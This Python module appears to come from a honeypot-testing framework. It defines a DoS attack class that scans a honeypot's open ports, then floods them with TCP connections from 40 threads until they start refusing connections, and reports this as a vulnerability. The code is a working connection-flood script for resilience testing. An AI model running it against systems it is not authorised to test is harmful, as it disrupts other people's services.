import socket
import time

from threading import Thread
from .base_attack import AttackResults, BaseAttack, BaseHoneypot
from .honeypot_port_scanner.honeypot_port_scanner import (HoneypotPortScanner,
                                                          PortList)


class DoS(BaseAttack):
    def __init__(self, honeypot: BaseHoneypot) -> None:
        """
        Initializes a new DoSAllOpenPorts object.

        Args:
            honeypot (BaseHoneypot): Honeypot object to get the information
                                     for performing the DoS on the honeypot.
        """
        super().__init__(honeypot)
        self.honeypot_ports: PortList = []
        self.honeypot_rejecting_connections: bool = False
        self.num_threads: int = 40

    def run_scanner(self) -> None:
        """
        Run the HoneypotPortScanner to get the open ports of the honeypot.
        """
        honeypot_scanner = HoneypotPortScanner(self.honeypot.ip)
        honeypot_scanner.run_scanner()
        self.honeypot_ports = honeypot_scanner.get_open_ports()

    def start_connections(self) -> None:
        """
        Attempt to flood the honeypot with connections until
        it starts rejecting them.
        """
        while not self.honeypot_rejecting_connections:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            for port in self.honeypot_ports:
                try:
                    sock.connect((self.honeypot.ip, port))
                    sock.send(b"A")
                    sock.recv(1024)
                    time.sleep(0.01)
                except Exception:
                    self.honeypot_rejecting_connections = True
                    break
                finally:
                    sock.close()

    def manage_attack(self) -> None:
        """
        Creates a thread pool to manage each thread flooding the honeypot
        with connections.
        """
        threads: list[Thread] = [Thread(target=self.start_connections)
                                 for _ in range(self.num_threads)]
        for thread in threads:
            thread.start()
        while not self.honeypot_rejecting_connections:
            time.sleep(1)
        for thread in threads:
            thread.join()

    def run_attack(self) -> AttackResults:
        """
        Launch the DoS attack using multiple threads.

        Returns:
            AttackResults: The results of the attack.
        """
        self.run_scanner()
        time.sleep(.5)
        print(f"Running DoS attack on {self.honeypot.ip} and "
              f"ports: {self.honeypot_ports}")
        start_time: float = time.time()
        self.manage_attack()
        end_time: float = time.time()
        time_taken: float = end_time - start_time
        return (True,
                "Vulnerability found: DoS attack made the honeypot reject connections",
                time_taken,
                self.num_threads)
